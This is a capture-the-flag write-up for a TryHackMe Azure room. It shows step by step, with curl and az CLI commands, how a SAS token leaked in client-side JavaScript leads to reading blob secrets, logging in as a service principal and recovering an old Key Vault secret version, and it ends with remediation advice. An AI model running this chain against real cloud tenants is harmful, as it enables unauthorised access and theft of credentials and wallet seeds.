# TryHackMe — Hacker Holidays 2026
## Day 9: [CryptoCabana](https://tryhackme.com/room/hh-cryptocabana-f81cac95)

**Platform:** [TryHackMe](https://tryhackme.com)  
**Category:** Cloud / Azure / Storage / Key Vault  
**Difficulty:** Medium  
**Status:** Complete — flag recovered

---

## Description

The CryptoCabana kiosk promises to back up your seed phrase securely: *"Backed up. Sleep easy."* But the landing page is a little too confident. The objective is to figure out what the kiosk is quietly trusting, follow that trust into storage, and recover the real key material hidden behind a rotated value.

The key idea of this room is that a public web app can accidentally expose cloud storage credentials and let you enumerate files that were never meant to be public.

## Attack chain overview

1. **Inspect the public site** → read the HTML and JavaScript the kiosk serves to everyone.
2. **Find the trust boundary mistake** → discover that the app embeds an Azure Storage SAS token directly in client-side JavaScript.
3. **List cloud storage containers** → use the SAS token to enumerate containers in the storage account.
4. **Read the vault contents** → find a seed phrase and a backup service account JSON file.
5. **Use Azure CLI / Cloud Shell** → authenticate with the backup service account.
6. **Enumerate Key Vault secrets** → discover three visible secret shards plus a rotated shard.
7. **Recover the old secret version** → list secret versions and read the previous value of the rotated shard.
8. **Reassemble the flag** → concatenate the shards into the final flag.

---

## Step 1 — Inspect the public kiosk page

The room gives us this public URL:

```text
https://cryptocabanaf5scjagc.z13.web.core.windows.net/
```

The page says:

> Back up your seed phrase below and we'll back it up to your own private vault. Never stored on your device, never shared. Promise.

At first glance this sounds safe, but in web security you should always ask: **what is the browser being given for free?** If the page includes secrets, tokens, or hidden endpoints in JavaScript, those are not secret anymore.

### Read the client-side JavaScript

```bash
curl -s https://cryptocabanaf5scjagc.z13.web.core.windows.net/app.js
```

**Flag/options used:**
- `-s` → silent mode; hides progress output so we only see the file contents.

**Output (relevant):**

```javascript
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
const BACKUPS_CONTAINER = "backups";
const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=...";
```

**Explanation:** this is the important leak. The kiosk is hardcoding:
- the **storage account name** (`cryptocabanaf5scjagc`),
- the **container name** (`backups`),
- and a **SAS token**.

### What is a SAS token?

A **SAS** (Shared Access Signature) token is a temporary access key for Azure Storage. It lets you grant limited permissions without sharing the full account key. Here the token includes `sp=rl`, which means:
- `r` = read
- `l` = list

So the page is literally giving visitors a token that can **list** and **read** storage content.

> This is the trust mistake: the kiosk trusts client-side JavaScript to hold a token that should not be publicly exposed.

---

## Step 2 — Enumerate the storage container

The JavaScript tells us to look in the `backups` container. We can list its contents directly with the SAS token:

```bash
curl -s "https://cryptocabanaf5scjagc.blob.core.windows.net/backups?restype=container&comp=list&sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=..."
```

**Flag/options used:**
- `-s` → silent mode.

**Why the URL has `restype=container&comp=list`:** that is the Azure Blob API way of asking: *"show me every blob inside this container."*

**Output:** empty. The `backups` container is currently empty.

That means the interesting data is probably elsewhere in the storage account.

---

## Step 3 — Enumerate all containers in the storage account

Because the SAS token allows listing, we can ask Azure Storage to show every container in the account:

```bash
curl -s "https://cryptocabanaf5scjagc.blob.core.windows.net/?comp=list&sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=..."
```

**Output (relevant):**

```xml
<Container><Name>$web</Name></Container>
<Container><Name>backups</Name></Container>
<Container><Name>vault</Name></Container>
```

**Explanation:** we found a third container called **`vault`**. That sounds much more important than `backups`. This is a classic case of **storage enumeration**: once you have a read/list SAS, you should always see what else exists in the account.

---

## Step 4 — Read the vault contents

Now list the blobs inside `vault`:

```bash
curl -s "https://cryptocabanaf5scjagc.blob.core.windows.net/vault?restype=container&comp=list&sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=..."
```

**Output (relevant):**

```xml
<Blob><Name>backup-service-account.json</Name></Blob>
<Blob><Name>seed_phrase.txt</Name></Blob>
```

Two interesting files:
- `seed_phrase.txt`
- `backup-service-account.json`

### Read the seed phrase

```bash
curl -s "https://cryptocabanaf5scjagc.blob.core.windows.net/vault/seed_phrase.txt?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=..."
```

**Output:**

```text
velvet cabana rebuild scatter obvious wallet drift lagoon punchline receipt orbit shrimp
```

**Explanation:** this looks like a BIP39-style mnemonic seed phrase. It is probably the wallet backup the room talks about.

### Read the backup service account file

```bash
curl -s "https://cryptocabanaf5scjagc.blob.core.windows.net/vault/backup-service-account.json?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=..."
```

**Output (relevant):**

```json
{
  "client_id":"dbcf2923-e4eb-4b72-a0a4-688aa1185cf5",
  "client_secret":"UBX8Q~xM6v[REDACTED]AuxcrAlbRg",
  "key_vault_name":"ccabana-kv-f5scjagc",
  "key_vault_uri":"https://ccabana-kv-f5scjagc.vault.azure.net/",
  "tenant_id":"8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"
}
```

**Explanation:** this is a service principal — basically an Azure identity for automation. It gives us a way to authenticate to Azure and access the Key Vault.

> **Why is this bad?** Secrets should not be stored in a blob that is readable via a public SAS token. This is exactly the kind of issue the room is teaching: a public web page exposed a chain that led to private cloud secrets.

---

## Step 5 — Authenticate to Azure with the service principal

The room expects us to use **Azure Cloud Shell** or Azure CLI. In Cloud Shell, run:

```bash
az login --service-principal \
  -u dbcf2923-e4eb-4b72-a0a4-688aa1185cf5 \
  -p 'UBX8Q~xM6v[REDACTED]AuxcrAlbRg' \
  --tenant 8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c
```

**Flag/options used:**
- `login` → authenticates the CLI.
- `--service-principal` → tells Azure we are logging in as an app/service identity, not a human user.
- `-u` → the username here is the **client ID** of the service principal.
- `-p` → the password here is the **client secret**.
- `--tenant` → specifies which Azure tenant to authenticate against.

**Explanation:** once this succeeds, Azure CLI can act as the backup automation account.

---

## Step 6 — List Key Vault secrets

Now that we are authenticated, list the secret names in the vault:

```bash
az keyvault secret list \
  --vault-name ccabana-kv-f5scjagc \
  --query "[].name" \
  -o tsv
```

**Flag/options used:**
- `keyvault secret list` → lists all secrets in the vault.
- `--vault-name` → selects the Key Vault.
- `--query "[].name"` → uses Azure CLI query syntax to print only the `name` field.
- `-o tsv` → prints the result as plain text, one item per line.

**Output:**

```text
key-shard-1
key-shard-2
key-shard-3
master-key
```

**Explanation:** the flag is likely split into parts. We need to read each shard.

---

## Step 7 — Read the secret shards

### Read `key-shard-1`

```bash
az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-1 --query value -o tsv
```

**Output:**

```text
THM{[REDACTED_1]}
```

### Read `key-shard-2`

```bash
az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-2 --query value -o tsv
```

**Output:**

```text
Rotated this after IT flagged it -- old value should still be recoverable if you know where to look.
```

**Explanation:** this is not the real shard. It is a hint saying the secret was **rotated**, and that the old value may still exist in a previous version.

### Read `key-shard-3`

```bash
az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-3 --query value -o tsv
```

**Output:**

```text
[REDACTED_3]}
```

If we concatenate the visible shards, we get:

```text
THM{[REDACTED_1] ... [REDACTED_3]}
```

The missing part is in `key-shard-2`'s older version.

### Why not use `master-key`?

```bash
az keyvault secret show --vault-name ccabana-kv-f5scjagc --name master-key --query value -o tsv
```

This returns **Forbidden**. The service account can list/read some secrets, but not that one. So the solution is not to brute-force the vault — it is to recover the old version of the rotated secret.

---

## Step 8 — Recover the old version of `key-shard-2`

First, list the versions of `key-shard-2`:

```bash
az keyvault secret list-versions \
  --vault-name ccabana-kv-f5scjagc \
  --name key-shard-2 \
  -o table
```

**Output:** two versions exist.

Then print the full IDs in JSON:

```bash
az keyvault secret list-versions \
  --vault-name ccabana-kv-f5scjagc \
  --name key-shard-2 \
  --query "[].{id:id, updated:attributes.updated}" \
  -o json
```

**Output (relevant):**

```json
[
  {
    "id": "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/3d6492d2c6f74123bc754a9ded22b2a0",
    "updated": "2026-07-28T01:05:05+00:00"
  },
  {
    "id": "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/c922c422ffb34671a902389c372314f1",
    "updated": "2026-07-28T01:05:07+00:00"
  }
]
```

**Explanation:** Key Vault stores **versions** of secrets. A rotated secret does not always erase the old one immediately; often the old version is still accessible if you know its exact version ID.

### Read the older version

```bash
az keyvault secret show --id 'https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/3d6492d2c6f74123bc754a9ded22b2a0' --query value -o tsv
```

**Output:**

```text
[REDACTED_2]
```

Now the shard is complete.

---

## Step 9 — Reassemble the flag

Combine the three real shards:

- `key-shard-1` → first part of the flag
- `key-shard-2` old version → middle part of the flag
- `key-shard-3` → final part of the flag

Final flag:

```text
THM{[REDACTED]}
```

---

## Root Cause

This room chained together a few common cloud-security mistakes:

1. **Publicly exposed SAS token in client-side JavaScript**  
   The app hardcoded an Azure Storage SAS token directly into `app.js`. Anyone who loaded the page got read/list access to the storage account.

2. **Sensitive secrets stored in a readable blob container**  
   The vault container exposed a seed phrase and a service principal JSON file.

3. **Rotated secret version still accessible**  
   A secret value was rotated, but the old version remained accessible through Azure Key Vault versioning.

### Remediation

| Issue | Fix |
| --- | --- |
| SAS token in frontend JavaScript | Never embed storage tokens in client-side code; keep storage access behind a server-side API |
| Sensitive blobs in readable storage | Restrict containers with least privilege and avoid storing secrets in blobs |
| Secret rotation with exposed old versions | Audit Key Vault access and remove stale/legacy secret versions when appropriate |

---

## Result

Challenge solved by:
1. inspecting the public kiosk page and finding the Azure Storage SAS token,
2. listing the storage account containers and discovering a hidden `vault` container,
3. reading the seed phrase and backup service account JSON from the vault,
4. authenticating to Azure with the backup service account,
5. enumerating Key Vault secrets,
6. recovering the old version of the rotated `key-shard-2` secret,
7. recombining the shards into the final flag.

**Flag:** `THM{[REDACTED]}`
